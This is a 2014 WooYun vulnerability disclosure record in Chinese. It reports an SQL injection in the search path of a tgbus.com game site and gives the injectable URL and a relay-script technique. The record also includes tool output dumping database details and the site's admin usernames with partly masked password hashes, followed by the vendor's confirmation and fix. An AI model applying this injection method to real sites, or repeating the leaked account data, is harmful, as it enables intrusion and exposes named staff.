{"id": 3965, "wybug_id": "wooyun-2014-057061", "wybug_title": "电玩巴士某站search型sql注入可登录厂商账户", "wybug_corp": "电玩巴士", "wybug_author": "浩天", "wybug_date": "2014-04-14 18:44", "wybug_open_date": "2014-05-29 18:45", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "字符类型注射", "后台被猜解", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-29：\t细节向公众公开  简要描述： I like '%tgbus%' 详细说明：  sql注入点地址：http://wan.tgbus.com/kaifu/search/1'\n\n   漏洞证明：  因为不是参数形式提交的，所以中转注入了一下\nhttp://localhost:8080/inj.php?id=1'Target: \thttp://localhost:8080/inj.php?id=1Host IP:\tlocalhostWeb Server: \tApache/2.2.21 (Win32) PHP/5.3.8Powered-by: \tPHP/5.3.8DB Server: \tMySQL error basedCurrent DB: \ttgbus_wanDB User: \t'tgbus_wan'@'172.30.26.26'Data Bases: \tinformation_schema                tgbus_wan                test\n报错看到是dedecms，直接添加的表名、字段\n\n总共1200+的厂商，读了几个，可以解密、登录，也没在继续干啥了\n\n下面是管理用户，打码了dede_adminData Found: userid=lj331Data Found: userid=xiaoyuData Found: userid=chenbangzhongData Found: userid=wypData Found: userid=tangllData Found: userid=xuanchData Found: userid=zlData Found: userid=zhangjData Found: userid=tgbuscwbData Found: userid=wangjunData Found: userid=zglData Found: userid=gaodiData Found: userid=chenyData Found: pwd=d1f188********96fb53Data Found: pwd=c3949*******e56e057fData Found: pwd=9ab42*******9d614c5cData Found: pwd=ea5ad*******4f7b41a3Data Found: pwd=1e5bc******b5602952aData Found: pwd=6c9fb*******b3b0d48bData Found: pwd=e***********8b172551Data Found: pwd=0d47*********d540c13Data Found: pwd=c394********e56e057fData Found: pwd=6c9fb***********d48bData Found: pwd=5cd17*******4b042e4aData Found: pwd=e6ffc*******998f3fe0   修复方案：  不是dede的问题，是新加搜索keyword参数没做处理   版权声明：转载请注明来源 浩天@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-04-15 09:53 厂商回复： 感谢白帽浩天指出的该站漏洞,现已核实,是由于开发在做二次模块开发时没有做好相应的安全过滤机制,导致的该问题的产生.现已将功能下线并进行修复.再次感谢白帽浩天. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-15 10:18 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  厂商给10rank，结果这个问题是按小厂商走的，我得到2rank，感觉不会再爱了    \n     2014-05-15 11:11 |    \t\txiaokinghk \t\t\t( 实习白帽子  |\t\t\t        Rank:82 漏洞数:16        | 【DBA】)\t\t \n  @浩天 淡定    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}